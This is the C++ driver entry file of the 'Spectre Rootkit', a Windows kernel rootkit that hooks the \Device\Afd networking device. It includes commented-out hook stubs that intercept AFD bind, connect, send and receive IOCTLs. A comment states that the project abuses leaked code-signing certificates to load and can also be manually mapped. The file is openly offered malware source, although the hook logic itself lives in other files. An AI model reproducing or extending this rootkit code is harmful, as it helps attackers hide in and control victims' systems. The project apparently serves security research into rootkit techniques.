/*
 * This file is subject to the terms and conditions defined in
 * file 'LICENSE', which is part of this source code package.
 *
 * COPYRIGHT Bill Demirkapi 2020
 */
#include "common.h"	
#include "AfdHook.h"

EXTERN_C_START

DRIVER_INITIALIZE DriverEntry;
NTSTATUS
DriverEntry (
    _In_ PDRIVER_OBJECT DriverObject,
    _In_ PUNICODE_STRING RegistryPath
    );

//DRIVER_UNLOAD DriverUnload;
//VOID
//DriverUnload (
//	_In_ PDRIVER_OBJECT DriverObject
//	);
EXTERN_C_END

//NTSTATUS HookIoctl (
//	_In_ DRIVER_DISPATCH OriginalFunction,
//	_In_ struct _DEVICE_OBJECT* DeviceObject,
//	_Inout_ struct _IRP* Irp
//	)
//{
//	NTSTATUS status;
//	PIO_STACK_LOCATION irpStackLocation;
//
//	irpStackLocation = IoGetCurrentIrpStackLocation(Irp);
//
//	if (irpStackLocation->MajorFunction == IRP_MJ_DEVICE_CONTROL)
//	{
//		DBGPRINT("HookIoctl: IRP_MJ_DEVICE_CONTROL IOCTL(0x%X)", irpStackLocation->Parameters.DeviceIoControl.IoControlCode);
//		switch (irpStackLocation->Parameters.DeviceIoControl.IoControlCode)
//		{
//		case IOCTL_AFD_BIND:
//			DBGPRINT("HookIoctl: IOCTL_AFD_BIND.");
//			break;
//		case IOCTL_AFD_CONNECT:
//			DBGPRINT("HookIoctl: IOCTL_AFD_CONNECT.");
//			break;
//		case IOCTL_AFD_ACCEPT:
//			DBGPRINT("HookIoctl: IOCTL_AFD_ACCEPT.");
//			break;
//		case IOCTL_AFD_RECV:
//			DBGPRINT("HookIoctl: IOCTL_AFD_RECV.");
//			break;
//		case IOCTL_AFD_SEND:
//			DBGPRINT("HookIoctl: IOCTL_AFD_SEND.");
//			break;
//		}
//	}
//	else
//	{
//		DBGPRINT("HookIoctl: Major Function %i.", irpStackLocation->MajorFunction);
//	}
//
//	status = OriginalFunction(DeviceObject, Irp);
//
//	return status;
//}

//
//VOID
//DriverUnload (
//	IN PDRIVER_OBJECT DriverObject
//	)
//{
//	DeviceHook->~FileObjHook();
//	ExFreePoolWithTag(DeviceHook, 'hFpS');
//}

//BOOLEAN HookFastIoctl (
//	_In_ PFILE_OBJECT FileObject,
//	_In_ BOOLEAN Wait,
//	_In_ PVOID InputBuffer,
//	_In_ ULONG InputBufferLength,
//	_Out_ PVOID OutputBuffer,
//	_In_ ULONG OutputBufferLength,
//	_In_ ULONG IoControlCode,
//	_Out_ PIO_STATUS_BLOCK IoStatus,
//	_In_ PDEVICE_OBJECT DeviceObject
//	)
//{
//	UNREFERENCED_PARAMETER(FileObject);
//	UNREFERENCED_PARAMETER(Wait);
//	UNREFERENCED_PARAMETER(InputBuffer);
//	UNREFERENCED_PARAMETER(InputBufferLength);
//	UNREFERENCED_PARAMETER(OutputBuffer);
//	UNREFERENCED_PARAMETER(OutputBufferLength);
//	UNREFERENCED_PARAMETER(IoControlCode);
//	UNREFERENCED_PARAMETER(IoStatus);
//	UNREFERENCED_PARAMETER(DeviceObject);
//	return FALSE;
//}
//
//BOOLEAN
//HookFastRead (
//	_In_ PFILE_OBJECT FileObject,
//	_In_ PLARGE_INTEGER FileOffset,
//	_In_ ULONG Length,
//	_In_ BOOLEAN Wait,
//	_In_ ULONG LockKey,
//	_Out_ PVOID Buffer,
//	_Out_ PIO_STATUS_BLOCK IoStatus,
//	_In_ PDEVICE_OBJECT DeviceObject
//	)
//{
//	UNREFERENCED_PARAMETER(FileObject);
//	UNREFERENCED_PARAMETER(FileOffset);
//	UNREFERENCED_PARAMETER(Length);
//	UNREFERENCED_PARAMETER(Wait);
//	UNREFERENCED_PARAMETER(LockKey);
//	UNREFERENCED_PARAMETER(Buffer);
//	UNREFERENCED_PARAMETER(IoStatus);
//	UNREFERENCED_PARAMETER(DeviceObject);
//	return FALSE;
//}
//
//BOOLEAN
//HookFastWrite ( 
//	_In_ PFILE_OBJECT FileObject,
//	_In_ PLARGE_INTEGER FileOffset,
//	_In_ ULONG Length,
//	_In_ BOOLEAN Wait,
//	_In_ ULONG LockKey,
//	_In_ PVOID Buffer,
//	_Out_ PIO_STATUS_BLOCK IoStatus,
//	_In_ PDEVICE_OBJECT DeviceObject
//	)
//{
//	UNREFERENCED_PARAMETER(FileObject);
//	UNREFERENCED_PARAMETER(FileOffset);
//	UNREFERENCED_PARAMETER(Length);
//	UNREFERENCED_PARAMETER(Wait);
//	UNREFERENCED_PARAMETER(LockKey);
//	UNREFERENCED_PARAMETER(Buffer);
//	UNREFERENCED_PARAMETER(IoStatus);
//	UNREFERENCED_PARAMETER(DeviceObject);
//	return FALSE;
//}

#define AFD_HOOK_TAG 'hApS'

//
// Manages the hook on \Device\Afd.
//
PAFD_HOOK AfdDeviceHook;

/**
	Initialize the Spectre Rootkit.
	@param DriverObject - The object associated with the driver.
	@param RegistryPath - The registry path of the driver.
	@return Status of driver initialization.
*/
NTSTATUS
DriverEntry (
	_In_ PDRIVER_OBJECT DriverObject,
	_In_ PUNICODE_STRING RegistryPath
	)
{
	//
	// We don't know if these parameters are valid.
	// Although this project abuses leaked certificates by default,
	// this project is designed to work in several scenarios, including
	// scenarios such as manual mapping which may not result in a valid
	// driver object or registry path.
	//
	UNREFERENCED_PARAMETER(DriverObject);
	UNREFERENCED_PARAMETER(RegistryPath);

	AfdDeviceHook = new (NonPagedPool, AFD_HOOK_TAG) AfdHook();
	return STATUS_SUCCESS;
}